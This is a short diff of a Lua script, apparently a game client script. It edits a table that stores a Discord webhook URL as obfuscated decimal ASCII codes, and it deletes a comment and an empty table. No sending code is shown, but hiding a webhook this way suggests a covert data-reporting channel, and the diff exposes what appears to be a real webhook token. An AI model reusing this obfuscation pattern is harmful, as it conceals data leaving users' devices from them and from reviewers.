@@ -67,7 +67,6 @@ local function CheckDevice()
 	end
 end
 
--- Webhook (obfuscated): Replace this with your actual webhook ASCII codes if needed
 local Webhooks = {
 	Whitelisted = {
 		104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,
@@ -77,9 +76,6 @@ local Webhooks = {
 		56,114,122,88,82,116,81,114,75,120,66,116,74,78,119,70,99,69,
 		109,85,115,122,57,65,81,112,71,52,85,77,66,104,65,97,53,90,103,
 		68,67,95,73,73,106,84,116,83,71,53,105,105
-	},
-	Normal = { -- You can define more keys like this
-		-- Add another webhook here if needed
 	}
 }
 
